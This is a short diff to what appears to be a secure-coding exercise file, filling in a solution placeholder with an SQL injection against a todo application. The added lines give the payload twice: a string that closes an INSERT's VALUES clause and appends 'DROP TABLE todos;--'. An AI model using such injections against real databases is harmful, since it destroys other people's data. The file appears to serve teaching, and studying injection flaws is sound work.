@@ -1,2 +1,7 @@
 With the following input I managed to commit SQL injection:
 <put your 'solution' here>
+Works both with and without a double quote as the first character:
+Add to this: "VALUES ('" +
+Solution:
+tiiiitle', '112345677777778999', 'ACTIVE');DROP TABLE todos;--
+"tiiiitle', '112345677777778999', 'ACTIVE');DROP TABLE todos;--
